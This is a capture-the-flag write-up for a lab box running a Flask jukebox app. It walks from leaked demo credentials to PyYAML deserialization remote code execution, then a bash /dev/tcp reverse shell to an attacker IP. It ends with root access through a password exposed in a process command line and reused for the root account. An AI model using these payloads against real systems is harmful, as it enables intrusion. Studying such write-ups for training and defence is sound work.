# Beach Bar

**Tags:** `flask` `pyyaml-deserialization` `rce` `credential-reuse` `linux`

The beach bar's jukebox takes song requests from anyone with a phone. The briefing hints at three things — a DJ who never logs out, a queue that accepts more than song titles, and a service quietly announcing "something" — and each one turns out to be a real finding on the box.

---

## Recon

Full port + service scan on the target.

```bash
nmap -sC -sV -p- -T4 10.112.150.245
```

![nmap scan](../Screenshots/beach-bar/nmap_scan.png)

Only two ports open: SSH on 22 and a Gunicorn web app on 80 that redirects to `/login` — Gunicorn means a Python/Flask backend.

---

## Web Enumeration

Pulled the raw source of the login page and looked for anything left behind in the HTML.

```bash
curl -s http://10.112.150.245/login 
```

![leaked credentials](../Screenshots/beach-bar/leaked_creds.png)

Demo credentials `dj / dj` were sitting in an HTML comment above the form — that's the DJ who never logs out.

---

## Logging In

Logged in with the leaked creds and landed on the dashboard.

![dashboard](../Screenshots/beach-bar/dashboard.png)

The dashboard exposes an **Import / Export** feature that loads playlists as raw YAML into the Flask backend — the queue that accepts more than song titles.

---

## Confirming RCE

Since YAML is being parsed server-side, tested for unsafe deserialization with a harmless `os.system` payload in the Import textarea.

```yaml
playlist: !!python/object/apply:os.system
  args: ['sleep 5']
```

![rce confirmed](../Screenshots/beach-bar/rce_confirm.png)

The app returned `{'playlist': 0}` — the `0` is the return code of `os.system()`, confirming arbitrary command execution.

Once I had a shell I read the source to pin down the bug.

```bash
cat /opt/beach-bar/webapp/app.py
```

![vulnerable yaml.load](../Screenshots/beach-bar/yaml_load.png)

The `/import` route calls `yaml.load(content, Loader=yaml.Loader)` instead of `yaml.safe_load()` — `yaml.Loader` deserializes arbitrary Python objects, which is exactly why the payload ran.

---

## Getting a Shell

Started a listener, then sent a reverse-shell payload through the same Import field (swap in your VPN IP).

```bash
nc -lvnp 4444
```

```yaml
playlist: !!python/object/apply:os.system
  args: ['bash -c "bash -i >& /dev/tcp/192.168.152.228/4444 0>&1"']
```

![reverse shell](../Screenshots/beach-bar/shell.png)

Shell landed as `bartender` (the gunicorn worker runs as that user), giving us a foothold on the box.

---

## User Flag

Stabilized the shell and read the flag from the user's home directory.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
cat /home/bartender/user.txt
```

![user flag](../Screenshots/beach-bar/user_flag.png)

User flag captured as `bartender`.

---

## Privilege Escalation

`sudo -l`, SUID, cron and capabilities were all clean, so I looked at running processes.

```bash
ps auxww | grep -v "\[" | grep root
```

![leaked stream password](../Screenshots/beach-bar/ps_streampass.png)

A root-owned daemon `jukeboxd.py` is running with `--stream-pass SunsetSpritz2024!` right in its command line.

---

## Root

Tried the leaked stream password directly against the root account.

```bash
su root
# password: SunsetSpritz2024!
```

![root flag](../Screenshots/beach-bar/root_flag.png)

The stream password was reused as root's login password `su root` dropped straight into a root shell, and the flag was in `/root/root.txt`.

---

